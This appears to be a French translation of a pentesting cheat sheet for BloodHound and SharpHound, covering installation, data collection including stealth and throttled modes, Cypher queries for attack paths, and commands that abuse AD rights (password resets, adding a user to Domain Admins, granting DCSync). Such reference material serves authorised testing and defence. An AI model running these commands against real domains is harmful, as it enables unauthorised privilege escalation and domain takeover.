# 🩸 BloodHound — visualisation des chemins d’attaque Active Directory

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) | [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ██╗      ██████╗  ██████╗ ██████╗ ██╗  ██╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
  ██╔══██╗██║     ██╔═══██╗██╔═══██╗██╔══██╗██║  ██║██╔═══██╗██║   ██║████╗  ██║██╔══██╗
  ██████╔╝██║     ██║   ██║██║   ██║██║  ██║███████║██║   ██║██║   ██║██╔██╗ ██║██║  ██║
  ██╔══██╗██║     ██║   ██║██║   ██║██║  ██║██╔══██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
  ██████╔╝███████╗╚██████╔╝╚██████╔╝██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ 
                        Visualisation des chemins d’attaque AD
```

<p align="center">
  <img src="https://img.shields.io/badge/BloodHound-Active_Directory-red?style=for-the-badge" alt="BloodHound">
  <img src="https://img.shields.io/badge/Attack_Paths-blue?style=for-the-badge" alt="Chemins d’attaque">
  <img src="https://img.shields.io/badge/Graph_Database-green?style=for-the-badge" alt="Graphe">
</p>

---

## 📋 Table des matières

- [Qu’est-ce que BloodHound ?](#-quest-ce-que-bloodhound-)
- [Installation](#-installation)
- [Collecte avec SharpHound](#-collecte-avec-sharphound)
- [Utiliser l’interface graphique de BloodHound](#-utiliser-linterface-graphique-de-bloodhound)
- [Requêtes intégrées](#-requêtes-intégrées)
- [Requêtes Cypher personnalisées](#-requêtes-cypher-personnalisées)
- [Analyse des chemins d’attaque](#-analyse-des-chemins-dattaque)
- [BloodHound CE](#-bloodhound-ce)
- [Référence rapide](#-référence-rapide)
- [Ressources](#-ressources)

---

## 🎯 Qu’est-ce que BloodHound ?

**BloodHound** utilise la théorie des graphes pour révéler les chemins d’attaque cachés dans Active Directory. Il visualise :

- 🔗 **Chemins d’attaque** — Parcours vers les administrateurs du domaine (Domain Admins)
- 👤 **Relations entre utilisateurs** — Appartenances aux groupes et sessions
- 💻 **Relations de confiance des ordinateurs** — Droits d’administration et sessions
- 🔓 **Erreurs de configuration** — Permissions exploitables
- 🎯 **Cibles de grande valeur** — Comptes critiques

### Composants

| Composant | Description |
|-----------|-------------|
| **BloodHound** | Interface graphique de visualisation (basée sur Neo4j) |
| **SharpHound** | Collecteur de données (.exe ou .ps1) |
| **Neo4j** | Moteur de base de données orientée graphe |
| **BloodHound CE** | Nouvelle édition cloud/entreprise, selon l’original |

> **Différence de génération :** le guide mêle BloodHound historique, son client de bureau et Neo4j, à BloodHound Community Edition (CE), doté d’une interface web. CE signifie « édition communautaire » et ne désigne pas l’offre Enterprise. Menus, installation et collecteurs doivent correspondre à l’édition utilisée ([présentation officielle](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)).

---

## 🚀 Installation

### Kali Linux

> **Exemples historiques :** les blocs d’installation et de connexion à Neo4j décrivent surtout l’ancienne génération. Le paquet Kali actuel fournit CE ; ses composants et son démarrage diffèrent. Le conteneur du bloc Docker ci-dessous ne lance que Neo4j, pas toute l’application BloodHound ([paquet Kali](https://www.kali.org/tools/bloodhound/)).

```bash
# Installer BloodHound
sudo apt update
sudo apt install bloodhound

# Installer Neo4j
sudo apt install neo4j

# Démarrer Neo4j
sudo neo4j start

# Accéder à l’interface Neo4j : http://localhost:7474
# Identifiants par défaut : neo4j / neo4j (à modifier à la première connexion)

# Démarrer BloodHound
bloodhound
```

### Windows

```powershell
# Télécharger depuis les versions publiées sur GitHub
https://github.com/BloodHoundAD/BloodHound/releases

# Installer Neo4j Community Edition
https://neo4j.com/download/

# Démarrer Neo4j
# Exécuter en tant qu’administrateur et démarrer le service

# Lancer BloodHound.exe
```

### Docker (recommandé dans l’original)

```bash
# Neo4j avec une configuration destinée à BloodHound
docker run -d \
  --name neo4j \
  -p 7474:7474 -p 7687:7687 \
  -e NEO4J_AUTH=neo4j/bloodhound \
  neo4j:4.4

# Attendre le démarrage, puis lancer BloodHound
bloodhound
```

---

## 📡 Collecte avec SharpHound

### Télécharger SharpHound

> **Précision :** l’ancien dossier Collectors et la variante PowerShell ne garantissent pas un collecteur compatible avec CE. La documentation actuelle fournit SharpHound CE depuis son interface ou ses versions publiées ([collecteur officiel](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound)).

```bash
# Depuis les versions publiées de BloodHound
https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors

# Fichiers :
# - SharpHound.exe (exécutable autonome)
# - SharpHound.ps1 (PowerShell)
```

### Collecte de base

> **Correction de l’original :** une exécution sans option utilise `Default`, pas automatiquement `All`. Les méthodes, options et ensembles évoluent ; les listes et estimations de « bruit » ci-dessous sont indicatives. `DCOnly` ou le mode discret réduisent certaines collectes sans garantir l’invisibilité ; `--skipdns` ne figure pas dans la référence actuelle ([options officielles](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound-flags)).

```powershell
# Lancer SharpHound (par défaut — toutes les méthodes, selon l’original)
.\SharpHound.exe

# Préciser le domaine
.\SharpHound.exe -d domain.local

# Préciser la sortie
.\SharpHound.exe -o C:\Temp\

# Version PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound
```

### Méthodes de collecte

```powershell
# Toutes les méthodes de collecte
.\SharpHound.exe -c All

# Méthodes précises
.\SharpHound.exe -c Default
.\SharpHound.exe -c Group
.\SharpHound.exe -c Session
.\SharpHound.exe -c Trusts
.\SharpHound.exe -c ACL
.\SharpHound.exe -c Container
.\SharpHound.exe -c RDP
.\SharpHound.exe -c DCOM
.\SharpHound.exe -c PSRemote
.\SharpHound.exe -c LocalAdmin
.\SharpHound.exe -c LocalGroup
.\SharpHound.exe -c SPNTargets
.\SharpHound.exe -c DCOnly
```

### Détail des méthodes de collecte

| Méthode | Description | Bruit réseau |
|--------|-------------|-------|
| Default | Group, LocalAdmin, Session, Trusts | Faible |
| All | Ensemble des données | Élevé |
| Session | Utilisateurs connectés | Moyen |
| LocalGroup | Membres des groupes locaux | Moyen |
| ACL | Permissions des listes de contrôle d’accès | Faible |
| DCOnly | Collecte limitée aux contrôleurs de domaine (DC) | Très faible |
| Group | Appartenances aux groupes | Faible |
| Trusts | Relations d’approbation entre domaines | Faible |

### Collecte discrète (stealth)

```powershell
# Mode discret (plus lent, moins de trafic caractéristique)
.\SharpHound.exe -c DCOnly
.\SharpHound.exe --stealth

# Sans résolution DNS
.\SharpHound.exe --skipdns

# Délai entre les requêtes
.\SharpHound.exe --throttle 1000
```

### Collecte répétée des sessions

```powershell
# Collecter les sessions au fil du temps
.\SharpHound.exe -c Session --loop --loopduration 02:00:00

# Boucler avec un intervalle
.\SharpHound.exe -c Session --loop --loopinterval 00:05:00
```

### Depuis Linux (bloodhound.py)

> **Précision :** BloodHound.py distingue les branches et formats destinés à BloodHound historique et à CE. L’installation `bloodhound` et la commande du texte anglais ne doivent pas être supposées compatibles avec toute édition ; les exemples restent inchangés ([projet officiel](https://github.com/dirkjanm/BloodHound.py)).

```bash
# Installer
pip install bloodhound

# Lancer la collecte
bloodhound-python -u user -p 'password' -d domain.local -ns 10.10.10.1 -c All

# Avec une empreinte
bloodhound-python -u user --hashes :NTLMHASH -d domain.local -c All
```

---

<a id="-utiliser-linterface-graphique-de-bloodhound"></a>
## 🖥️ Utiliser l’interface graphique de BloodHound

### Démarrer BloodHound

```bash
# 1. Démarrer Neo4j
sudo neo4j start

# 2. Attendre Neo4j (vérifier http://localhost:7474)

# 3. Démarrer BloodHound
bloodhound

# 4. Se connecter
# URL : bolt://localhost:7687
# Nom d’utilisateur : neo4j
# Mot de passe : (votre mot de passe)
```

### Importer les données

```
1. Cliquer sur "Upload Data" (Importer des données, icône de dossier)
2. Sélectionner le fichier .zip produit par SharpHound
3. Attendre la fin de l’importation
4. Les données apparaissent dans le graphe
```

### Présentation de l’interface

| Section | Description |
|---------|-------------|
| **Search** (recherche) | Rechercher utilisateurs, ordinateurs et groupes |
| **Analysis** (analyse) | Requêtes prédéfinies |
| **Filters** (filtres) | Visibilité des relations et des nœuds |
| **Graph** (graphe) | Représentation visuelle |
| **Node Info** (informations sur le nœud) | Détails de l’élément sélectionné |

### Navigation

```
- Clic gauche : sélectionner un nœud
- Clic droit : ouvrir le menu contextuel
- Molette : zoomer ou dézoomer
- Glisser : déplacer la vue
- Ctrl+Clic : ajouter à la sélection
```

---

## 🔍 Requêtes intégrées

Les noms anglais sont conservés pour les retrouver dans l’interface historique, avec une explication française. Leur disponibilité dépend de l’édition. Un *principal* est une entité de sécurité, par exemple un utilisateur, un groupe ou un ordinateur ; *owned* indique qu’elle a été marquée comme compromise.

### Informations sur le domaine

```
- Find all Domain Admins — Rechercher tous les administrateurs du domaine
- Find all Domain Controllers — Rechercher tous les contrôleurs de domaine
- Find high value targets — Rechercher les cibles de grande valeur
- Map Domain Trusts — Cartographier les relations d’approbation entre domaines
```

### Chemins les plus courts

```
- Shortest Paths to Domain Admins — Chemins les plus courts vers les administrateurs du domaine
- Shortest Path from Owned Principals — Chemin le plus court depuis les entités compromises
- Shortest Path to High Value Targets — Chemin le plus court vers les cibles de grande valeur
- Shortest Path to Unconstrained Delegation — Chemin le plus court vers la délégation non contrainte
```

### Kerberos

```
- Find Kerberoastable Accounts — Rechercher les comptes exposés au Kerberoasting
- Find AS-REP Roastable Users — Rechercher les utilisateurs exposés à l’AS-REP Roasting
- Shortest Path from Kerberoastable Users — Chemin le plus court depuis ces utilisateurs
- Find Principals with Unconstrained Delegation — Rechercher les entités avec délégation non contrainte
```

### Analyse des listes de contrôle d’accès (ACL)

```
- Find Principals with DCSync Rights — Rechercher les entités disposant de droits DCSync
- Find Dangerous Rights for Domain Users — Rechercher les droits dangereux accessibles aux utilisateurs du domaine
- Find Users with Foreign Domain Group Membership — Rechercher les utilisateurs membres de groupes d’un autre domaine
```

### Ordinateurs

```
- Find Computers with Unsupported OS — Rechercher les ordinateurs dont le système n’est plus pris en charge
- Find Computers where Domain Users are Local Admin — Rechercher les ordinateurs où les utilisateurs du domaine sont administrateurs locaux
- Find Computers with Sessions of High Value Users — Rechercher les ordinateurs avec des sessions d’utilisateurs de grande valeur
```

### Objets de stratégie de groupe (GPO)

```
- Find all GPO Owned by Owned Principals — Rechercher les GPO détenues par des entités compromises
- Find GPO Affecting High Value Targets — Rechercher les GPO affectant des cibles de grande valeur
```

---

## 📝 Requêtes Cypher personnalisées

> **Précision :** ces requêtes conservent le schéma et les propriétés historiques, notamment `owned` et `highvalue`. La syntaxe acceptée dépend de l’édition et du moteur de graphe. La requête `SET` modifie les données du graphe, au lieu d’effectuer une simple lecture ; l’autorisation des mutations dépend aussi de la configuration ([configuration officielle](https://bloodhound.specterops.io/get-started/custom-installation)).

### Requêtes de base

```cypher
// Rechercher tous les utilisateurs
MATCH (u:User) RETURN u

// Rechercher tous les ordinateurs
MATCH (c:Computer) RETURN c

// Rechercher tous les administrateurs du domaine
MATCH (g:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (u:User)-[:MemberOf*1..]->(g)
RETURN u.name

// Rechercher tous les contrôleurs de domaine
MATCH (c:Computer)-[:MemberOf*1..]->(g:Group)
WHERE g.name CONTAINS "DOMAIN CONTROLLERS"
RETURN c.name
```

### Requêtes sur les sessions

```cypher
// Rechercher les ordinateurs où les administrateurs du domaine ont une session
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN u.name, c.name

// Rechercher les utilisateurs ayant des sessions sur plusieurs ordinateurs
MATCH (c:Computer)-[:HasSession]->(u:User)
WITH u, COUNT(c) as sessions
WHERE sessions > 5
RETURN u.name, sessions
ORDER BY sessions DESC
```

### Requêtes sur les chemins

```cypher
// Chemin le plus court vers les administrateurs du domaine
MATCH p=shortestPath(
  (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
  -[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p

// Chemins vers les administrateurs du domaine (limite : 10)
MATCH p=(u:User)-[*1..5]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
RETURN p LIMIT 10

// Chemins depuis les entités marquées comme compromises
MATCH p=shortestPath(
  (u {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
)
RETURN p
```

### Requêtes sur les ACL

```cypher
// Utilisateurs disposant de droits DCSync
MATCH (u)-[:GetChanges]->(d:Domain)
MATCH (u)-[:GetChangesAll]->(d)
RETURN u.name

// Utilisateurs pouvant réinitialiser des mots de passe
MATCH (u:User)-[:ForceChangePassword]->(t:User)
RETURN u.name, t.name

// Utilisateurs disposant de GenericAll sur des ordinateurs
MATCH (u:User)-[:GenericAll]->(c:Computer)
RETURN u.name, c.name
```

### Requêtes Kerberos

```cypher
// Utilisateurs exposés au Kerberoasting avec un chemin vers DA
MATCH (u:User {hasspn:true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN u.name, LENGTH(p)

// Utilisateurs exposés à l’AS-REP Roasting
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

// Ordinateurs avec délégation non contrainte
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name
```

### Cibles de grande valeur

```cypher
// Marquer les cibles de grande valeur
MATCH (u:User {name:"TARGETUSER@DOMAIN.LOCAL"})
SET u.highvalue = true

// Rechercher les chemins vers les cibles de grande valeur
MATCH p=shortestPath(
  (u:User)-[*1..]->(t {highvalue:true})
)
RETURN p
```

---

## 🎯 Analyse des chemins d’attaque

### Rechercher des chemins d’attaque

> **Précision :** le graphe représente les données collectées et leurs relations, pas une preuve d’exploitation réussie. Les sessions changent ; une relation `HasSession` ne garantit pas que des identifiants récupérables sont présents. Les droits `GetChanges` et `GetChangesAll` doivent être combinés sur le domaine concerné ; une relation isolée ne suffit pas. Chaque étape dépend des droits, de leur portée et des conditions du système ([DCSync](https://bloodhound.specterops.io/resources/edges/dc-sync), [relation HasSession](https://bloodhound.specterops.io/resources/edges/has-session)).

```
1. Rechercher le nœud de départ (utilisateur compromis)
2. Clic droit → "Mark as Owned" (Marquer comme compromis)
3. Lancer la requête "Shortest Path from Owned Principals"
4. Analyser les relations du chemin
```

### Relations courantes des chemins d’attaque

| Relation (edge) | Méthode d’attaque |
|------|---------------|
| **MemberOf** | Appartenance à un groupe |
| **AdminTo** | Droits d’administration locale |
| **HasSession** | Collecte d’identifiants |
| **CanRDP** | Accès RDP |
| **CanPSRemote** | Accès à distance PowerShell |
| **ExecuteDCOM** | Exécution DCOM |
| **GenericAll** | Contrôle total |
| **GenericWrite** | Modification de l’objet |
| **WriteOwner** | Changement de propriétaire |
| **WriteDacl** | Modification de l’ACL |
| **ForceChangePassword** | Réinitialisation du mot de passe |
| **AddMember** | Ajout à un groupe |
| **AllExtendedRights** | Droits étendus, dont DCSync selon le contexte |
| **GetChanges** | DCSync (première partie) |
| **GetChangesAll** | DCSync (deuxième partie) |

### Exploiter les relations d’un chemin d’attaque

#### GenericAll sur un utilisateur

```powershell
# Réinitialiser le mot de passe
net user targetuser NewP@ssw0rd /domain

# Ou avec PowerView
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewP@ssw0rd' -AsPlainText -Force)
```

#### GenericAll sur un ordinateur

```powershell
# Attaque par délégation contrainte basée sur les ressources
# Utiliser Rubeus + PowerMad
```

#### ForceChangePassword

```powershell
# Réinitialiser le mot de passe
net user targetuser NewP@ssw0rd /domain
```

#### AddMember

```powershell
# Ajouter un utilisateur au groupe
net group "Domain Admins" attackeruser /add /domain

# Ou avec PowerView
Add-DomainGroupMember -Identity "Domain Admins" -Members "attackeruser"
```

#### WriteDacl

```powershell
# Ajouter des droits DCSync
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attackeruser -Rights DCSync
```

---

## 🆕 BloodHound CE

### À propos de BloodHound CE

**BloodHound Community Edition** est la nouvelle version présentée dans l’original :
- Interface web moderne
- Base PostgreSQL, et non Neo4j, selon le texte original
- API REST
- Performances améliorées

> **Correction de l’architecture :** « PostgreSQL, pas Neo4j » est trop catégorique. CE utilise PostgreSQL pour les données applicatives et peut utiliser PostgreSQL ou Neo4j comme moteur de graphe, selon la version et la configuration. Le démarrage actuellement documenté passe par le BloodHound CLI, qui pilote Docker Compose ; la commande historique ci-dessous est conservée ([installation personnalisée](https://bloodhound.specterops.io/get-started/custom-installation), [démarrage CE](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)).

### Installation

```bash
# Docker Compose (recommandé dans l’original)
curl -L https://ghst.ly/getbhce | docker compose -f - up

# Accès : http://localhost:8080
# Par défaut : admin / (consulter les journaux Docker)
```

### SharpHound pour CE

```powershell
# Télécharger un collecteur compatible avec CE
# Depuis les versions publiées de BloodHound CE

# Lancer la collecte (même syntaxe)
.\SharpHound.exe -c All
```

---

## 📊 Référence rapide

### Commandes SharpHound

| Commande | Description |
|---------|-------------|
| `.\SharpHound.exe` | Collecte par défaut |
| `.\SharpHound.exe -c All` | Toutes les méthodes |
| `.\SharpHound.exe -c DCOnly` | Contrôleurs de domaine uniquement (discret selon l’original) |
| `.\SharpHound.exe -c Session --loop` | Collecte répétée des sessions |
| `.\SharpHound.exe -d domain.local` | Préciser le domaine |
| `.\SharpHound.exe --stealth` | Mode discret |

### Requêtes courantes

| Requête | Objectif |
|-------|---------|
| Find all Domain Admins | Identifier les membres administrateurs du domaine |
| Shortest Path to DA | Rechercher un chemin d’attaque |
| Kerberoastable Users | Rechercher les comptes avec SPN exposés au Kerberoasting |
| AS-REP Roastable | Rechercher les utilisateurs sans préauthentification |
| Unconstrained Delegation | Étudier l’abus de délégation non contrainte |
| DCSync Rights | Rechercher les entités disposant de droits DCSync |

### Déroulement de l’analyse

```
1. Collecter les données avec SharpHound
2. Les importer dans BloodHound
3. Marquer les entités compromises
4. Lancer "Shortest Path from Owned"
5. Analyser les relations du chemin d’attaque
6. Exécuter les attaques
7. Marquer les nouvelles entités compromises
8. Répéter
```

### Fichiers importants

Les noms ci-dessous sont schématiques et dépendent du collecteur et de sa version ; les fichiers JSON peuvent notamment porter un préfixe. Une collecte peut produire des résultats incomplets selon les permissions et les méthodes sélectionnées ([SharpHound CE](https://bloodhound.specterops.io/collect-data/ce-collection/sharphound)).

```
Sortie de SharpHound :
- *_BloodHound.zip (données JSON)
- computers.json
- users.json
- groups.json
- domains.json
- sessions.json
- ous.json
- gpos.json
- containers.json
```

---

## 📚 Ressources

- [BloodHound sur GitHub](https://github.com/BloodHoundAD/BloodHound)
- [SharpHound](https://github.com/BloodHoundAD/SharpHound)
- [Documentation de BloodHound](https://bloodhound.readthedocs.io/)
- [bloodhound.py](https://github.com/fox-it/BloodHound.py)

### Aide-mémoire associés
- [Mimikatz](../../Mimikatz/translations/README.fr.md)
- [PowerShell](../../PowerShell/translations/README.fr.md)
- [Élévation de privilèges Windows](../../Windows-PrivEsc/translations/README.fr.md)

---

<p align="center">
  <b>🩸 Trouvez un chemin vers les administrateurs du domaine !</b><br>
  <i>BloodHound — l’allié du pentesteur Active Directory</i>
</p>
